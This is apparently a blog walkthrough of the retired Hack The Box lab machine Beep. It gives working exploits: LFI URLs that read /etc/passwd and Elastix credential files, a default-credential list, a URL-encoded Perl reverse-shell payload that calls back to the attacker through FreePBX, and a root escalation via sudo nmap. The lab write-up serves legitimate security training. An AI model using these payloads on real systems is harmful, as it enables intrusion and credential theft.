**Welcome** to this walkthrough for the [Hack The Box](https://www.hackthebox.com/) machine Beep. This one is listed as an 'easy' box and has also been retired, so access is only provided to those that have purchased VIP access to HTB.
Because of this, you may notice that it is necessary to be connected to HTB's VIP VPN server, rather than the free server. To do this, change the dropdown selection in the top right corner where you select "Connect"
to "VIP" and download the .ovpn package (yes, even as a paid user, you must toggle between free and paid VPN packages depending on the machine).

## Service Enumeration  

I went ahead and started my NMap scan and then plugged the IP address into the browser to check for HTTP and HTTPS respectfully: **10.10.10.7:80** & **10.10.10.7:443**

```bash
sudo nmap -sS -A -sV -T5 -p- 10.10.10.7 | tee nmap_full.txt
dirb http://10.10.10.7/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | tee dirb.log
nikto -h "http://10.10.10.7/" | tee nikto.log 
```

### Elastix Login Discovered  

HTTP redirects us to an HTTPS home page hosting an Elastix login form :  

![Elastix Login Form](/assets/images/HTB/beep/elastix.png)  

Elastix is a type of communications server software that helps link Asterisk-based Private Branch Exchanges (PBX), email, instant messaging, faxing and other services.  
It is noteworthy that Elastix runs on the Community Enterprise Operating System Linux (CentOS).  

I unsuccessfully tried some SQL injection as well common default credentials I found online for Elastix login forms :  

```
' OR 1=1; --: ' OR 1=1; --
admin:admin
admin:password
admin:mypassword
admin:palosanto
admin:eLaStIx.2oo7
MySQL:mysql
```

No good, let's check out our scan results.

### NMap Results :  

The first thing I noticed was the wide array of public-facing services on this machine.  
In fact, the only part of this box I found difficult was the overwhelming amount of services to enumerate.  

Take a look at the open TCP ports:  

```
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)

```  

Most of these are pretty interesting, but I spent a lot of time searching for public exploits on these services :  

```
searchsploit postfix
searchsploit apache 2.2.3
searchsploit cyrus 2.3.7
searchsploit hylafax 4.3.10
searchsploit asterisk 1.1
searchsploit miniserv 1.57
searchsploit webmin
searchsploit elastix
```  

Most of these services have public exploits, but I had issues matching them to an existing version number. Additionally, I still didn't have the version number of webmin, elastix, and postfix.

### Dirb Results :  

I actually only snagged a few directories from this scan because Dirb seemed to be running extremely slowly on this box.  
In fact, trying to run other directory busters like ffuf or dirbuster didn't work at all due to unusual TLS signatures.  

Here are the directories that Dirb returned before I killed it:  

```
==> DIRECTORY: https://10.10.10.7/images/                                                                          
==> DIRECTORY: https://10.10.10.7/help/

==> DIRECTORY: https://10.10.10.7/mail/                                                                            
==> DIRECTORY: https://10.10.10.7/admin/                                                                           
==> DIRECTORY: https://10.10.10.7/static/                                                                          
==> DIRECTORY: https://10.10.10.7/lang/                                                                            
==> DIRECTORY: https://10.10.10.7/var/                                                                             
==> DIRECTORY: https://10.10.10.7/panel/                                                                           
==> DIRECTORY: https://10.10.10.7/libs/                                                                            
==> DIRECTORY: https://10.10.10.7/recordings/ 
```  

Ooh... /admin/ 		&nbsp;  	**(. ) (. )**  

Following this /admin/ directory takes me to a window with a pop-up login form. 
I tried the same default credentials listed earlier, but to no avail. Clicking 'close' on the pop-up redirects us to /admin/config.php.  
This php page appears to be a console panel for FreePBX, and we grab the FreePBX version number : 2.8.1.4  

![FreePBX Vers.](/assets/images/HTB/beep/freepbx.png)

I checked a few more of these like /panel/ which appears empty but when inspecting the source, has a title, "Flash Operator Panel."  
But honestly did not even get through all of them before moving to my Nikto results.  
I also examined /recordings/ which hosts a FreePBX User Login Portal for Voicemail Mail with an HTML Footer listing FreePBX 2.5 :  

![Voicemail Mailbox Login](/assets/images/HTB/beep/freepbx-user.png)  

Lastly, /mail/ takes us to a Roundcube Webmail login portal :  

![Roundmail Login Portal](/assets/images/HTB/beep/roundmail.png)  

Inspecting this page, there was even some commented-out javascript that appeared to handle different login objects and mail objects, also specifying a plaintext request_token.  
It seemed the tasks were handled in the browser from /mail/?_task= but I couldn't get the webpage to respond to my attempts.  
Additionally, we can view some of the .js files and others for this page via a public-facing directory at /mail/program/ which I noticed in the /mail/ source code.

```

So from here we can grab the PHP version : 5.1.6. We also see that the site uses SSL, which seems to be our issue with running some of the directory busters.  
It also caught the outdated Apache version, which I tried a few searchsploit exploits on.  

At this point, I realized the /help/ directory may be very sensitive (thanks, Nikto) and navigated there to find extensive lists of information, including running services and system/user information.  
I note here that vTigerCRM and OpenFire are running as well and take down some information on current users/etc.  

![/help/ Information Disclosure](/assets/images/HTB/beep/help.png)  

Information Overload!

## Exploiting vTigerCRM / Elastix  

After trying default creds on all of these login pages, searching directories, hunting version numbers, I finally get to vTigerCRM.  
A quick google suggests looking for its contents at /vtigercrm/ ... and its there :

![vTigerCRM Login Page](/assets/images/HTB/beep/tiger-login.png)

The bottom of this webpage also shows us a version of 5.1.0 so I do a quick version and a Local File Inclusion shows up for this version number.  
I downloaded the exploit :  

```bash 
searchsploit -m 18770
```

Here is what it looks like (easy, simple LFI) : 

```
# Exploit Title: VTiger CRM
# Google Dork: None
# Date: 20/03/2012
# Author: Pi3rrot
# Software Link: http://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.1.0/
# Version: 5.1.0
# Tested on: CentOS 6
# CVE : none

We have find this vulnerabilitie in VTiger 5.1.0
In this example, you can see a Local file Inclusion in the file sortfieldsjson.php

Try this :
https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

Well, I gave it a try and it worked immediately :  

![vTigerCRM /etc/passwd LFI](/assets/images/HTB/beep/vtiger-passwd.png)  

So I started a Burp 'sweep' of sensitive files via Intruder using an LFI Seclist /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -- my favorite.  

![Burpsuite Positions](/assets/images/HTB/beep/burp-payload.png)  

This came back with quite a bit of sensitive information :  

![Burpsuite Results](/assets/images/HTB/beep/burp-lfi.png)  

### Elastix Dashboard Login

But while it was running, I went back to hunting around for exploits and came across an Elastix 2.2.0 LFI via vTigerCRM directory :  

```
############################################################
# Exploit Title: Elastix 2.2.0 LFI
# Google Dork: :(
# Author: cheki
# Version:Elastix 2.2.0
# Tested on: multiple
# CVE : notyet
# romanc-_-eyes ;)
# Discovered by romanc-_-eyes
# vendor http://www.elastix.org/

print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki   \n";
print "\t 0day Elastix 2.2.0  \n";
print "\t email: anonymous17hacker{}gmail.com \n";

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```  

The server immediately responded to my request and I captured amportal.conf via Burp - full of credentials!  

![amportal.conf Credentials](/assets/images/HTB/beep/creds.png)  

After reading through the response for a while I successfully logged into Elastix :  

```
Site: https://10.10.10.7/

Username: admin
Password: jEhdIekWmdjE
```

This takes us to the Elastix dashboard and there is a lot of information to enumerate here :  

![Elastix Dashboard](/assets/images/HTB/beep/elastix-dash.png)  

## Gain User Shell + Priv. Esc.

After taking a look at some of my options, I did what I normally do once I gain access to a system -- search for public, authenticated, service-related exploits.  
With little effort, I locate [this one](https://www.exploit-db.com/exploits/18650) on exploit-db that I viewed earlier.  

```
# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0A  
Application:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a  
%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw  
%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
```  

And the exploit even has potential for priv. esc. right after we gain a shell :  

```
# On Elastix, once we have a shell, we can escalate to root:
# root@bt:~# nc -lvp 443
# listening on [any] 443 ...
# connect to [172.16.254.223] from voip [172.16.254.72] 43415
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive
# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
```

>Looks do-able:
>>rhost = 10.10.10.7  
>>extension = some unknown extension that is assigned to a user for voice calls (enumerated from Elastix dashboard)  
>>lhost = my IP address (tun0)  
>>lport = 443

Going back to the dashboard we can easily enumerate an existing, valid extension for a user :  

![Extension Enumeration](/assets/images/HTB/beep/extension.png)  

So let's edit the exploit link with our specific information :  

```
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:
%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket
%3a%3aINET%28PeerAddr%2c%22[MY-IP-ADDRESS-TUN0-INTERFACE]%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b
%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```

So, we fire up a listener on the lport we specified (e.g. "nc -lvp 443") and plug that link into our browser to manipulate the PBX call service :  

![Exploited](/assets/images/HTB/beep/exploit.png)  

Alright, sweet. Although, we aren't able to move around much in this shell. Let's follow the privilege escalation steps from earlier.  

![PrivEsc -> Root](/assets/images/HTB/beep/root.png)  

### User Flag 

Just navigate to /home/ and then the user's account for the user.txt flag :  

![User Flag](/assets/images/HTB/beep/user-flag.png)  

### Root Flag  

Now, to /root/ for the root.txt flag :  

![Root Flag](/assets/images/HTB/beep/root-flag.png)

Congratulations!
